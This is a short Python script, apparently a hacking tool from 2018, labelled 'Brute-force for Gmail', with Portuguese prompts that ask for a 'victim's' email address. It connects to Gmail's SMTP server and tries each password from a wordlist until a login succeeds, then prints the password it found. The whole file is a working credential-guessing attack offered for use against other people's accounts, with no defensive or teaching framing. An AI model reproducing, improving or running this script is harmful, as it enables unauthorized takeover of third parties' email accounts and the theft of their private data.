import smtplib
import email.utils
s = "n" 
while s in ['n','N']:
	print("""\033[1;32m
	 _____         _                         _ _  \033[1;32m | Author: Corteisjr
	| __  |___ _ _| |_ ___ ___ ___ _____ ___|_| | \033[1;32m | Date: 04/10/2018
	| __ -|  _| | |  _| -_|___| -_|     | .'| | | \033[1;32m | Tool: Brute-force for Gmail
	|_____|_| |___|_| |___|   |___|_|_|_|__,|_|_| \033[1;32m | more info : +258840109913 whatsAp
	""")

	#variaves de entrada
	user = input("\033[1;33mInsira o email da vitima>> ")
	smtp = smtplib.SMTP("smtp.gmail.com", 587)
	smtp.ehlo()
	smtp.starttls()
	word = input("\033[1;33mPrecione P para wordlist padrao e W para inserir sua wordlist: ")

	if word == 'P':

		passwfile = 'wordlist.txt'
		passwfile = open(passwfile, "r").readlines()
		for senha in passwfile:
			try:
				smtp.login(user, senha)
				print('\033[1;31m[!]Senha encontrada!', senha)
				break
			except smtplib.SMTPAuthenticationError:
				print('\033[1;32m[!]Senha Incorreta', senha)
				
				#W para inserir wordlist
	elif word == 'W':
		lista = input("\033[1;33mInsira o nome da sua wordlist: ")
		lista = open(lista, "r").readlines()
		for password in lista:
			try:
				smtp.login(user, password)
				print('\033[1;31m[!]Senha encontrada! ', password)
				break
			except smtplib.SMTPAuthenticationError:	
				print('\033[1;32m[!]Senha Incorreta', password)		
	else:
		print('Opcao invalida')

	s = input('Deseja sair [S/N]: ')		
